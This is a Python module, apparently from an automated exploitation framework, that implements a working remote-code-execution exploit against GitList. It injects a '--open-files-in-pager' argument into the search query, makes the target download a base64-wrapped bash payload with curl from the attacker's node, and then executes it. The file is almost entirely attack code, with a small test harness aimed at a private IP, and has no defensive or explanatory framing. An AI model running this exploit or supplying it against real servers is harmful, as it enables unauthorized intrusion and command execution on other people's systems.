import base64
import os
import sys
import tempfile
import time
from typing import TYPE_CHECKING
from urllib.parse import quote

import requests

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

from utils import Exploiter

if TYPE_CHECKING:
    from main import ControledNode, LocalNode


def random_str():
    return next(tempfile._get_candidate_names())


class GitlistExploiter(Exploiter):
    def __init__(self, ip: str):
        super().__init__(ip)
        self.prefix = f"http://{self.ip}"
        self.is_rce = True
        self.is_endpoint = False

    def encode_cmd(self, cmd: str) -> str:
        cmd_b64 = base64.b64encode(cmd.encode()).decode()
        return f"echo {cmd_b64} | base64 -d | /bin/bash"

    def exploit_rce_init(self, proxier: "ControledNode | LocalNode | LocalNodeFake"):
        pass

    def exploit_rce(
        self, proxier: "ControledNode | LocalNode | LocalNodeFake", cmd
    ) -> str:
        encoded_cmd = self.encode_cmd(cmd)

        """
        with tempfile.NamedTemporaryFile("w") as temp_file:
            temp_file.write(encoded_cmd)
            temp_file.flush()
            upload_loc = random_str()
            proxier.upload_file(temp_file.name, upload_loc)
        """

        upload_loc = random_str()
        with open(f"/tmp/{upload_loc}", "w") as f:
            f.write(encoded_cmd)

        path = f"{self.prefix}/example/tree/a/search"
        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36",
        }

        cmd_download = f"curl -o /tmp/{upload_loc}-tmp http://{proxier.init_node_ip}:{proxier.init_node_port}/{upload_loc}"

        print(">", cmd_download)

        res = proxier.send_request(
            "post",
            path,
            headers=headers,
            data=f"query=--open-files-in-pager={cmd_download};",
        )

        time.sleep(2)

        print(">", encoded_cmd)

        res = proxier.send_request(
            "post",
            path,
            headers=headers,
            data=f"query=--open-files-in-pager=/bin/bash /tmp/{upload_loc}-tmp;",
        )

        return res.text

    def exploit_no_rce(self, proxier: "ControledNode | LocalNode | LocalNodeFake"):
        pass


if __name__ == "__main__":

    class LocalNodeFake:
        def __init__(self):
            self.session = requests.Session()
            self.ip = ""
            self.web_server_port = 20001

        def send_request(self, method: str, *argvs, **argv):
            if method.upper() == "GET":
                return self.session.get(*argvs, **argv)
            elif method.upper() == "POST":
                return self.session.post(*argvs, **argv)
            else:
                raise Exception("Method not supported")

        def upload_file(self, file_path: str, upload_loc: str):
            pass

    local_node_fake = LocalNodeFake()
    exploiter = GitlistExploiter("192.168.123.15")
    exploiter.exploit_rce_init(local_node_fake)
    exploiter.exploit_rce(local_node_fake, "touch /tmp/success")
    exploiter.exploit_no_rce(local_node_fake)
